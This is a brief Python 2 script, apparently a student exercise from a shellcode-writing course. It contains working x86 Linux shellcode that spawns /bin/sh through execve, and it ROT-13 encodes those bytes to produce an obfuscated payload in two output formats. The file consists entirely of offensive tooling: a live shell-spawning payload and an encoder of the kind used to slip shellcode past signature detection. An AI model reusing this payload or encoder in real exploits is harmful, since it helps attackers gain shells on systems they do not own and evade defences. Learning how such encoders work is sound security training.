#!/usr/bin/env python
# Filename: encoder.py
# Author: SLAE-14209

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

rot = 13
max = 256 - rot

encoded = ""
encoded2 = []

for x in bytearray(shellcode):
    if x < max:
        encoded += '\\x%02x' % (x + rot)
        encoded2.append('0x%02x' % (x + rot))
    else:
        encoded += '\\x%02x' % (rot - 256 + x)
        encoded2.append('0x%02x' % (rot - 256 + x))

print "Encoded:\n%s\n" % encoded

print "Encoded2:\n%s\n" % ','.join(encoded2)
